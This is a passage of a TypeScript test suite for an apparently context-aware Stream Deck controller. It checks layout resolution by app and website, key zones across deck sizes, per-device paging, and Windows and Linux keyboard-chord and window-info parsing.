		{ id: "site.studio.youtube.com", level: "sub", match: { url: "*://studio.youtube.com/*" }, keys: [{ label: "Studio" }] },
		{ id: "app.b", match: { bundleId: "b" } },
	] };
	assert.equal(resolve(c, ctx({ bundleId: "b", url: "https://studio.youtube.com/x" })).levels.sub?.id, "site.studio.youtube.com");
	const c2 = { layouts: [c.layouts[1], c.layouts[0], c.layouts[2]] };
	assert.equal(resolve(c2, ctx({ bundleId: "b", url: "https://studio.youtube.com/x" })).levels.sub?.id, "site.studio.youtube.com", "independent of file order");
	assert.equal(resolve(c, ctx({ bundleId: "b", url: "https://www.youtube.com/watch" })).levels.sub?.id, "site.youtube.com");
	const home = mkdtempSync(join(tmpdir(), "cd-"));
	wf(join(home, "config.json"), JSON.stringify({ layouts: [] }));
	wf(join(home, "empty.json"), "");
	assert.deepEqual(loadConfig(join(home, "config.json"), home).errors, []);
});

test("files go to the folder for their level", () => {
	assert.ok(layoutFile("sub.com.apple.mail.compose", "/L", { id: "sub.com.apple.mail.compose", level: "sub" }).endsWith("/L/subs/sub.com.apple.mail.compose.json"));
	assert.ok(layoutFile("site.linear.app", "/L").endsWith("/L/sites/site.linear.app.json"));
	assert.ok(layoutFile("takeover.recording", "/L").endsWith("/L/takeovers/takeover.recording.json"));
	assert.ok(layoutFile("system", "/L").endsWith("/L/system/system.json"));
});

test("a site page without dials borrows the browser's", () => {
	const r = resolve(cfg, ctx({ bundleId: "com.google.Chrome", url: "https://studio.youtube.com/x" }), { page: "sub" });
	assert.deepEqual(dialLabels(r), ["Tabs", "Scroll", "Zoom", "Volume"]);
	assert.equal(r.dialOwners[0]?.id, "app.browsers");
});

// ---------- devices ----------
const yt = { bundleId: "com.google.Chrome", app: "Chrome", url: "https://www.youtube.com/watch?v=1", title: "", sub: "", flags: {}, now: new Date("2026-10-24T12:00:00") } as Context;
const XL = { keys: 32, dials: 0, cols: 8, rows: 4, kind: "xl" };
const MINI = { keys: 6, dials: 0, cols: 3, rows: 2, kind: "mini" };
const MK2 = { keys: 15, dials: 0, cols: 5, rows: 3, kind: "mk2" };

test("zones for every deck: + keeps its zones; others split sub/app/system in reading order", () => {
	assert.deepEqual(zonesFor(PLUS), DEFAULT_ZONES);
	const xl = zonesFor(XL);
	assert.deepEqual(xl.system.keys, [23, 24, 25, 26, 27, 28, 29, 30]);
	assert.equal(xl.sub.keys.length, 12);
	assert.ok(xl.app.keys.includes(31), "the last key (page key) shows app keys when there's one page");
	const studio = zonesFor({ keys: 32, dials: 2, cols: 16, rows: 2 });
	assert.deepEqual([studio.sub.dials, studio.app.dials, studio.system.dials], [[0], [], [1]]);
	const plusXl = zonesFor({ keys: 36, dials: 6, cols: 9, rows: 4 });
	assert.deepEqual([plusXl.sub.dials, plusXl.app.dials, plusXl.system.dials], [[0, 1, 2], [3, 4], [5]]);
	assert.deepEqual(deviceOf({ id: "d", type: 13, size: { columns: 9, rows: 4 } }), { id: "d", name: undefined, kind: "plusxl", cols: 9, rows: 4, keys: 36, dials: 6 });
});

test("bigger decks show more at once (extra pages flow onto the smart page); smaller ones re-flow", () => {
	const all = loaded.config!;
	const plus = resolve(all, yt);
	const xl = resolve(all, yt, { geometry: XL });
	assert.equal(xl.keys.length, 32);
	const shown = (r: typeof xl) => r.keys.filter(Boolean).map((k) => k!.label);
	assert.ok(shown(xl).length > shown(plus).length, "XL shows more keys");
	assert.ok(shown(xl).includes("Pin Tab"), "browser's Tabs page appears on the XL smart page");
	assert.equal(xl.keys[23]?.label, plus.keys[7]?.label, "AI key leads the system row");
	const mini = resolve(all, yt, { geometry: MINI });
	assert.equal(mini.keys.length, 6);
	assert.equal(mini.dials.length, 0);
	const mk2App = resolve(all, yt, { geometry: MK2, page: "app" });
	assert.equal(mk2App.keys.filter(Boolean).length > 5, true);
	assert.equal(new Set(mk2App.keys.filter(Boolean).map((k) => k!.label)).size, mk2App.keys.filter(Boolean).length, "no key twice");
});

test("engine: two decks keep their own pages; a deck without dials gets a page key", () => {
	const { e } = rig(loaded.config!);
	const xlImages = new Map<number, string>();
	for (let i = 0; i < 15; i++) e.addKey({ id: `x${i}`, setImage: async (img) => { xlImages.set(i, Buffer.from(img!.split(",")[1], "base64").toString()); }, setTitle: async () => undefined, showAlert: async () => undefined, showOk: async () => undefined } as KeySurface, i, { id: "mk2", ...MK2 });
	e.updateContext(yt);
	assert.ok(xlImages.get(14)!.includes("page 1/"), "MK.2 last key pages");
	e.keyDown(14, "mk2"); e.keyUp(14, "mk2");
	assert.equal(e.snapshot().device.id, "mk2");
	assert.equal(e.snapshot().page.index, 1, "MK.2 moved to page 2");
	e.dialTouch(3, false, 190, "default");
	assert.equal(e.snapshot().device.id, "default");
	assert.equal(e.snapshot().page.index, 1, "+ paged on its own");
	e.dialTouch(3, false, 190, "default");
	assert.equal(e.snapshot().page.index, 2);
	e.keyDown(14, "mk2"); e.keyUp(14, "mk2");
	assert.equal(e.snapshot().page.index, 2, "MK.2 kept its own page (1 → 2)");
	assert.deepEqual(e.devices().map((d) => d.id).sort(), ["default", "mk2"]);
});

// ---------- Windows / Linux ----------
test("Windows/Linux: app ids pick the same layouts; per-OS actions; mac-only layouts stay on the Mac", () => {
	const win = (p: Partial<Context>) => ctx({ os: "win", ...p });
	assert.equal(resolve(cfg, win({ bundleId: "chrome.exe", app: "Google Chrome", url: "https://www.youtube.com/watch?v=1" })).levels.sub?.id, "site.youtube.com");
	assert.equal(resolve(cfg, win({ bundleId: "code.exe", app: "Visual Studio Code" })).levels.app?.id, "app.code-editors");
	assert.equal(resolve(cfg, ctx({ os: "linux", bundleId: "org.gnome.ptyxis", app: "Ptyxis" })).levels.app?.id, "app.terminals");
	const morning = ctx({ bundleId: "com.apple.finder", app: "Finder", now: new Date(2026, 9, 24, 8, 0) });
	assert.equal(resolve(cfg, morning).levels.app?.id, "app.desktop.morning");
	assert.notEqual(resolve(cfg, { ...morning, os: "win" }).levels.app?.id, "app.desktop.morning");
	const shot = resolve(cfg, ctx()).levels.system!.keys!.find((k) => k?.label === "Screenshot")!;
	assert.deepEqual(shot.action?.on?.win, { type: "keys", keys: "win+shift+s" });
});

test("Windows chords → virtual keys; cmd follows settings.cmdKey; accelerators parse", () => {
	assert.deepEqual(chordToVk(parseChord("cmd+shift+t")), { mods: [0x11, 0x10], key: 0x54, ext: false });
	assert.deepEqual(chordToVk(parseChord("cmd+t"), "win"), { mods: [0x5b], key: 0x54, ext: false });
	assert.deepEqual(chordToVk(parseChord("mod+v"), "win"), { mods: [0x11], key: 0x56, ext: false }, "mod is always ctrl off the Mac");
	assert.equal(chordToVk(parseChord("alt+left")).ext, true);
	assert.throws(() => chordToVk(parseChord("fn+f1")));
	const menus = parseAcceleratorDump(["&File\u001eNew &Window\tCtrl+Shift+N\ttrue", "Edit\u001eDelete\tDel\tfalse", "Bad line"].join("\r\n"));
	assert.deepEqual(menus, [{ path: ["File", "New Window"], chord: "ctrl+shift+n", enabled: true }, { path: ["Edit", "Delete"], chord: "fwddelete", enabled: false }]);
});

test("Linux: xprop parsing, xdotool key names, app names", () => {
	const out = 'WM_CLASS(STRING) = "Navigator", "firefox"\n_NET_WM_NAME(UTF8_STRING) = "Inbox \\"Var\\" — Mozilla Firefox"\n_NET_WM_PID(CARDINAL) = 4242';
	assert.deepEqual(parseXprop(out), { appId: "firefox", title: 'Inbox "Var" — Mozilla Firefox', pid: 4242 });
	assert.deepEqual(chordToXdo(parseChord("cmd+shift+]")), { mods: ["ctrl", "shift"], key: "bracketright" });
	assert.deepEqual(chordToXdo(parseChord("win+pagedown")), { mods: ["super"], key: "Next" });
	assert.deepEqual(chordToXdo(parseChord("f5")), { mods: [], key: "F5" });
	assert.equal(prettyName("google-chrome"), "Google Chrome");
	assert.equal(prettyName("org.gnome.Nautilus"), "Nautilus");
});
